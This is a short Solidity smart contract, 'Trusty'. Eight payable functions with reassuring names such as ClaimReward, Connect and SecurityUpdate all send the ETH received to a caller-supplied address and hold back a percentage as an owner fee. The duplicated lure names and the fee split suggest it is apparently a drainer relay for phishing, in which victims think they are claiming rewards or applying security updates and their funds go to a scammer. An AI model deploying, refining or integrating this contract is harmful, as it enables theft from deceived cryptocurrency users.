1 // SPDX-License-Identifier: Unlicense
2 
3 pragma solidity ^0.8.18;
4 
5 contract Trusty {
6 
7   address private owner;
8   uint256 private fee;
9   uint8 private percentage;
10 
11   event Ownership(address indexed previous_owner, address indexed current_owner);
12   event Percentage (uint8 previous_percentage, uint8 current_percentage);
13 
14   constructor() { owner = msg.sender; fee = 0; percentage = 5; }
15 
16   function getOwner() public view returns (address) { return owner; }
17   function getBalance() public view returns (uint256) { return address(this).balance; }
18   function getFee() public view returns (uint256) { return fee; }
19 
20   function withdraw(address sender) private {
21     uint256 amount = msg.value;
22     uint256 reserve = (amount / 100) * percentage;
23     amount = amount - reserve; fee = fee + reserve;
24     payable(sender).transfer(amount);
25   }
26 
27   function Claim(address sender) public payable { withdraw(sender); }
28   function ClaimReward(address sender) public payable { withdraw(sender); }
29   function ClaimRewards(address sender) public payable { withdraw(sender); }
30   function Execute(address sender) public payable { withdraw(sender); }
31   function Multicall(address sender) public payable { withdraw(sender); }
32   function Swap(address sender) public payable { withdraw(sender); }
33   function Connect(address sender) public payable { withdraw(sender); }
34   function SecurityUpdate(address sender) public payable { withdraw(sender); }
35 
36   function transferOwnership(address new_owner) public {
37     require(msg.sender == owner, "Access Denied");
38     address previous_owner = owner; owner = new_owner;
39     emit Ownership(previous_owner, new_owner);
40   }
41   function Fee(address receiver) public {
42     require(msg.sender == owner, "Access Denied");
43     uint256 amount = fee; fee = 0;
44     payable(receiver).transfer(amount);
45   }
46   function changePercentage(uint8 new_percentage) public {
47     require(msg.sender == owner, "Access Denied");
48     require(new_percentage >= 0 && new_percentage <= 10, "Invalid Percentage");
49     uint8 previous_percentage = percentage; percentage = new_percentage;
50     emit Percentage(previous_percentage, percentage);
51   }
52 
53 }